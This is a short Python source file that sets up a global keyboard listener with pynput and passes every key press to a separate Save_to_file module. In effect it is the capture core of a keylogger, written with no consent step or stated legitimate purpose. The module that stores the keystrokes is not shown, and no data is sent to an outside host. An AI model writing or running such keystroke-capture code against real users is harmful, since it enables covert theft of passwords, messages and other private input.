from pynput import keyboard
import Save_to_file


def key_press(key):
    Save_to_file.save_to_file(str(key))


def hook_keyboard():
    with keyboard.Listener(on_press=key_press) as listener:
        listener.join()
    print(listener)

